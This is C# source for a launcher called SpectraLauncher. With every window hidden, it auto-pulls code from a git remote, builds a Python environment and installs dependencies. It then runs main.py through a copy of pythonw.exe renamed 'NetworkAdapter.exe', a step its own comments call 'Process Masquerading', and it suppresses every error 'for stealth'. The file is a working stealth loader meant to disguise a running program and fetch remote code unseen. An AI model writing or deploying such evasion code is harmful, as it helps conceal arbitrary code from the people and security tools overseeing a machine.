using System;
using System.Diagnostics;
using System.IO;

namespace SpectraLauncher
{
    class Program
    {
        static void Main(string[] args)
        {
            try {
                string currentDir = AppDomain.CurrentDomain.BaseDirectory;
                string venvPath = Path.Combine(currentDir, "venv");
                string pyPath = Path.Combine(venvPath, "Scripts", "python.exe");
                string pywPath = Path.Combine(venvPath, "Scripts", "pythonw.exe");
                string pipPath = Path.Combine(venvPath, "Scripts", "pip.exe");
                string adapterPath = Path.Combine(venvPath, "Scripts", "NetworkAdapter.exe");
                
                // 0. Auto-update from GitHub
                RunCommandHidden("git", "pull origin main --quiet", true, currentDir);

                // 1. Create virtual environment if it doesn't exist
                if (!Directory.Exists(venvPath))
                {
                    RunCommandHidden("python", "-m venv venv", true, currentDir);
                }

                // 2. Install dependencies
                if (File.Exists(pipPath))
                {
                    RunCommandHidden(pipPath, "install -r requirements.txt --quiet", true, currentDir);
                }
                
                // 3. Process Masquerading
                try {
                    if (File.Exists(pyPath))
                    {
                        File.Copy(pyPath, adapterPath, true);
                    }
                    
                    // If pythonw.exe exists (windowless python), copy it over NetworkAdapter.exe to ensure no console flashes
                    if (File.Exists(pywPath))
                    {
                        File.Copy(pywPath, adapterPath, true);
                    }
                } catch {
                    // Ignore copy errors if the file is locked (app already running)
                }

                // 4. Run the app
                if (File.Exists(adapterPath))
                {
                    RunCommandHidden(adapterPath, "main.py", false, currentDir);
                }
                else
                {
                    // Fallback to global python
                    RunCommandHidden("pythonw", "main.py", false, currentDir);
                }
            }
            catch (Exception)
            {
                // Silent failure for stealth
            }
        }

        static void RunCommandHidden(string fileName, string arguments, bool waitForExit, string workingDir = "")
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = fileName;
            psi.Arguments = arguments;
            psi.CreateNoWindow = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.UseShellExecute = false;
            if (!string.IsNullOrEmpty(workingDir))
            {
                psi.WorkingDirectory = workingDir;
            }
            
            try
            {
                Process p = Process.Start(psi);
                if (waitForExit && p != null)
                {
                    p.WaitForExit();
                }
            }
            catch (Exception)
            {
                // Fail silently as requested for stealth
            }
        }
    }
}
